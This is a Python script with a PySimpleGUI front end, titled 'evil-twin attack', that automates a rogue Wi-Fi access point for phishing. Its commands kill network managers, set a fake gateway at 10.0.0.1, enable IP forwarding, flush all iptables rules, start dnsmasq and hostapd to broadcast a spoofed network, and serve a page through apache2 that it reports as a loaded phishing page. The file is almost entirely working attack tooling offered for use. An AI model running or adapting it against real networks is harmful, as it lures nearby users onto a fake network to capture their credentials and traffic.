import os
import sys
import time
import PySimpleGUI as sg
import threading

global window
global sniffer_interface
global network_name
sniffer_interface = sys.argv[1]
network_name = sys.argv[2]


def outlinepritner(str):
    global window
    os.system(str)
    time.sleep(0.2)
    window['_printer_'].update(str)
    window.refresh()


def reset_network():
    try:
        print("removing dnsmasq.conf")
        os.remove("dnsmasq.conf")
    except OSError:
        print("removing dnsmasq.conf failed")
    try:
        print("removing hostapd.conf")
        os.remove("hostapd.conf")
    except OSError:
        print("removing hostapd.conf failed")

        # cleaning
    outlinepritner('service NetworkManager start')
    outlinepritner('service hostapd stop')
    outlinepritner('service apache2 stop')
    outlinepritner('service dnsmasq stop')
    outlinepritner('service rpcbind stop')
    outlinepritner('killall dnsmasq')
    outlinepritner('killall hostapd')
    outlinepritner('systemctl enable systemd-resolved.service')
    outlinepritner('systemctl start systemd-resolved')


def main():
    global sniffer_interface
    global network_name
    global window
    sniffer_interface = sys.argv[1]
    network_name = sys.argv[2]


    layout = [[sg.Text('Choose name for create Fake ap ')],
              [sg.Input(key='Fake_name')],
              [sg.Button('select name'), sg.Button('Cancel')]]

    window = sg.Window('evil-twin attack', layout
                       , finalize=True)

    while True:
        event, values = window.read()
        if event == 'select name':
            if values['Fake_name'] =="":
                network_name=values['Fake_name']
            window.close
            layout = [[sg.Text('Choose name for fake ap  ')],
                  [sg.Text('command run')],
                  [sg.Text('', key='_printer_', size=(60, 1), justification='center', text_color='blue',
                           background_color='white')],
                  [sg.Button('Cancel')]]

            window = sg.Window('evil-twin attack', layout
                               , finalize=True)
            time.sleep(0.3)
            ap_thread = threading.Thread(target=commands_before_attack())  # run a script to find all connected adapters
            ap_thread.daemon = True
            ap_thread.start()

        if event == sg.WIN_CLOSED or event == 'Cancel':  # if user closes window or clicks cancel
            reset_network()
            break

def commands_before_attack():
    global sniffer_interface
    global network_name
    global window

    outlinepritner('systemctl disable systemd-resolved.service')
    outlinepritner('systemctl stop systemd-resolved')

    outlinepritner('service NetworkManager stop')

    # AP with address 10.0.0.1 with free 8 bits
    ifconfig = "ifconfig " + sniffer_interface + " 10.0.0.1 netmask 255.255.255.0"

    outlinepritner('airmon-ng check kill')
    outlinepritner(ifconfig)

    # create fake gw
    outlinepritner('route add default gw 10.0.0.1')

    # enable ip forwarding
    outlinepritner('echo 1 > /proc/sys/net/ipv4/ip_forward')

    # clear firewall ruled which might block some request
    outlinepritner('iptables --flush')
    outlinepritner('iptables --table nat --flush')
    outlinepritner('iptables --delete-chain')
    outlinepritner('iptables --table nat --delete-chain')

    # enable forwarding
    outlinepritner('iptables -P FORWARD ACCEPT')  #

    line = "python3 Conf_File_Server.py " + sniffer_interface + " " + network_name
    outlinepritner(line)

    # start the AP
    outlinepritner('dnsmasq -C dnsmasq.conf')
    outlinepritner('hostapd hostapd.conf -B')

    # start the server for to broadcast our default page
    outlinepritner('service apache2 start')
    outlinepritner('route add default gw 10.0.0.1')  # create fake gw
    time.sleep(1)
    print('---> Phishing page loaded \n')


if __name__ == '__main__':
    main()



